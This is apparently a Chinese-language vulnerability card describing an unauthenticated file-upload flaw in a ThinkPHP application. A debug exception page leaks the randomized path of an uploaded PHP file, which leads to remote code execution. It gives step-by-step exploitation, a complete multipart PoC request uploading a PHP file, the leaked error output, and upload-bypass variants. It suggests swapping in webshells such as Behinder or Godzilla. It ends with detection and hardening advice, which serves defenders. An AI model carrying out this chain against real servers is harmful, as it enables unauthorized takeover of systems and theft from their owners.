---
id: web-generic-file-upload-thinkphp-debug-error-path-leak
title: 未鉴权文件上传叠加 ThinkPHP 调试异常页变量泄露落盘路径 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-path-disclosure-via-debug-error
aliases:
- ThinkPHP 报错泄露上传路径
- Error Context 泄露 image 路径
- getSaveName 随机文件名 泄露
- 未鉴权上传 getshell
- ThinkPHP Undefined index 泄露数据
tags:
- php
- thinkphp
- file-upload
- webshell
- debug
- exception
- path-disclosure
- unauth
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V56
  verified_at: '2026-11-05T09:28:31+08:00'
  notes: 已对照原文核对：/dingtalk/index 未鉴权 move() 上传 image1..3 不校验后缀、getSaveName 随机名、$params["transport_type"] 未定义索引、ThinkPHP 调试 Error Context 泄露 image1..3 路径、访问 .php 得 phpinfo，均与 12 张图片一致。已修正卡片 PoC：补齐 street/health_type 等前置字段，避免简化请求先在更靠前的未定义索引处报错，并注明即使提前报错 data 仍含 image1 路径。原文文字称 transport_type 改数字触发，图片实为 transport_typea 导致 Undefined index，卡片按截图描述正确。原文无产品名/版本，不写 affected_versions 正确。
---

## 一句话结论

前台接口未鉴权接收文件、只 `move()` 不校验后缀，却用 `getSaveName()` 生成不可预测的文件名；此时在随后的入库逻辑中触发一个 ThinkPHP 异常（如漏传 `transport_type` 造成 `Undefined index`），调试异常页的 `Error Context` 会连同局部变量 `$data` 一起把 `image1`/`image2`/`image3` 的完整落盘路径打印出来，攻击者据此直接访问已上传的 PHP 文件即可 RCE。

## 原理

- **上传侧无校验**：`/dingtalk/index` 的 `index()` 在 POST 时取 `id` 查 `DingTalkUser`，随后对 `image1`、`image2`、`image3` 逐个执行 `$file->move(ROOT_PATH . 'public/upload/student_back')`；原文代码没有 `ext`/`fileExt` 白名单，也没有 MIME 或内容检查，文件名保留原后缀，PHP 文件会原样落到 Web 根目录下。
- **随机文件名挡住直接访问**：落盘名由 ThinkPHP 的 `getSaveName()` 生成（按日期分目录 + 哈希名），攻击者无法预测；代码虽把 `$data['image1'] = '/public/upload/student_back/<日期>/<name>.php'` 存库，但前台没有查询该路径的接口，也没有 SQL 注入，看似死路。
- **异常页把路径吐出来**：上传成功后代码继续执行 `$params = input('param.');` 并逐字段赋值 `$data['transport_type'] = $params['transport_type'];`（还有 `area`、`street`、`health_type`、`vaccine_type`、`time`、`area_type`、`description`、`date` 等）。当请求缺少 `transport_type`（原文实际发送的是拼写不同的 `transport_typea`）时，PHP 在 `IndexController.php line 172` 抛 `Undefined index: transport_type`。ThinkPHP 在 `app_debug=true` 时渲染详细异常页，其中 “Error Context” 会把当前作用域的 `params`、`data` 等变量完整 dump；`data` 里已包含刚上传文件的完整路径，等于给攻击者一个“路径回显 oracle”。
- **闭环**：拿到路径后直接请求 `/public/upload/student_back/<日期>/<name>.php`，PHP 解释器执行上传内容；原文截图以 `phpinfo()` 验证成功，换成一句话或冰蝎/哥斯拉马即可控制服务器。
- 该链的关键不是“随机文件名可猜”，而是“上传与错误回显在同一请求内完成”：先完成落盘，再因为后续字段缺失/类型不符进入异常分支，路径已经写进 `$data` 局部变量，异常页自然带出。

## 触发条件

- ThinkPHP 应用开启了调试模式（`app_debug=true`，攻防/测试环境常见），异常页对未授权用户可见；
- 存在未鉴权的上传接口，`move()` 未限制后缀、上传目录位于 Web 根且 PHP 可解析；
- 上传逻辑之后还会读取若干请求参数并写入 `$data`，存在可触发的未定义索引/类型错误（本例为 `transport_type`）；
- 请求中的 `id` 能在对应用户表中查到（原文用 `001`/`83668` 等已存在 id），否则不会走到上传分支。

## 利用步骤

1. 审计/探测上传接口：确认参数名（`id`、`image1..3`）、上传目录、是否校验后缀。
2. 构造 multipart 请求：带存在用户的 `id`、正常图片字段 `image1`（内容为 PHP 代码、文件名 `1.php`）、以及其他业务字段。
3. 故意漏传 `transport_type`（或发送 `transport_typea` 这类错误名，或发送与字段类型不符的值），使代码在 `$data['transport_type'] = $params['transport_type']` 处抛异常。
4. 从返回的 ThinkPHP 异常页 “Error Context” 的 `data` 中读取 `image1`/`image2`/`image3` 的完整路径。
5. 访问该路径执行 PHP 代码，完成 getshell。
6. 若一次请求只上传一个文件，可按同样方法用 `image2`/`image3` 增加成功率。

## PoC

```http
POST /dingtalk/index HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: PHPSESSID=1234567890

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="id"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="area"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="street"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="health_type"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="transport_typea"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="vaccine_typea"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="time"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="area_type"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="description"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="data"

83668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="image1"; filename="1.php"
Content-Type: text/plain

<?php phpinfo(); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

需同时补齐 `street`/`health_type`/`vaccine_typea`/`time`/`area_type`/`description`/`data` 等前置字段，异常才会落在 `transport_type` 行；若更靠前的字段缺失，异常会提前在对应行触发，但此时 `$data` 已包含 `image1` 路径，仍能从 Error Context 读到路径。

异常页关键回显（原文图 10/11）：

```text
[8] ErrorException in IndexController.php line 172
Undefined index: transport_type
Error Context
params: {"id":"83668","area":"83668","transport_typea":"83668",...}
data: {"image1":"\/public\/upload\/student_back\/20260118\/b81db1f277ff54f1f131a86346c4fbdb.php",
       "image2":"\/public\/upload\/student_back\/20260118\/ee8f6306c91bc0fc6c31ca52f2c5f942.php",
       "image3":"\/public\/upload\/student_back\/20260118\/d1ce4499485d0e7cd3979e82a5ba68ad.php",...}
```

随后访问 `/public/upload/student_back/20260118/<hash>.php`，原文截图返回 `PHP Version 5.6.40` 的 phpinfo 页面。

## 变体与关联

- 触发字段变体：任何在上传之后读取、但请求中缺失或类型不符的参数（`area`、`street`、`health_type`、`vaccine_type`、`time` 等）都可能触发同类异常，择优使用。
- 回显变体：ThinkPHP 关闭调试时，可尝试触发 SQL 错误/业务异常让错误信息进入响应；或通过日志、监控平台读取异常堆栈。
- 上传变体：双写后缀、`.php5`/`.phtml`、`Content-Type` 伪造、`.user.ini`/`.htaccess` 等，视目标解析配置而定（参见 [[web-generic-file-upload-extension-zero-check]]、[[web-generic-file-upload-htaccess-handler-override]]）。
- 通用模式：随机文件名不是安全边界；只要存在路径泄露（报错、日志、下载接口、ID 遍历），上传即可闭环。参见 [[web-generic-file-upload-save-then-validate-race]]（上传与校验时序问题）。

## 检测与防御

- 检测：未鉴权接口出现 `multipart/form-data` 且 filename 为 `.php`/`.phtml`/`.php5`；同一请求携带大量重复值字段（`83668`）或拼写异常字段（`transport_typea`）；响应为 ThinkPHP 异常页且包含 `Error Context`、`Undefined index`、`/public/upload/` 路径；随后对 `/public/upload/**/*.php` 的访问。
- 修复：上传接口加鉴权与 CSRF/权限校验；服务端按扩展名+MIME+文件头白名单校验并重命名（不要依赖 `getSaveName()` 的随机性）；上传目录移出 Web 根，或禁止该目录执行 PHP。
- 加固：生产环境关闭 `app_debug`，统一异常页不返回堆栈/变量；对 `input('param.')` 的每个字段先 `isset`/类型校验；错误日志仅写服务端。
- 补充：即使文件名随机，只要路径能通过报错/日志/数据库接口泄露，上传依旧可利用；应把“不可预测文件名”视为缓解而非修复。
